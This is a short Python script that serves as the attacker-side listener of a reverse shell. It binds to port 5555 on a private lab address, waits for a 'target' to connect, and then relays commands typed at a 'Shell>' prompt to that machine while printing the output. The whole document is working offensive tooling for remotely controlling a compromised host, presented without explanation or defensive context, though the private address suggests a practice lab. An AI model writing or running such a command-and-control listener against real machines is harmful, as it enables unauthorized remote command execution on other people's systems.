#!/bin/python3
import socket

def target_communication():
    while True:
        command = input("Shell> ")
        target.send(command.encode())
        if command.lower() == "exit":
            break
        result = target.recv(1024).decode()
        print(result)
    target.close()

host = '192.168.198.129'
port = 5555

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print("[+] Listening for incoming connections...")

    target, ip = s.accept()
    print("[+] Target connected from:", ip)

    target_communication()
except Exception as e:
    print("[-] Error:", e)
finally:
    s.close()

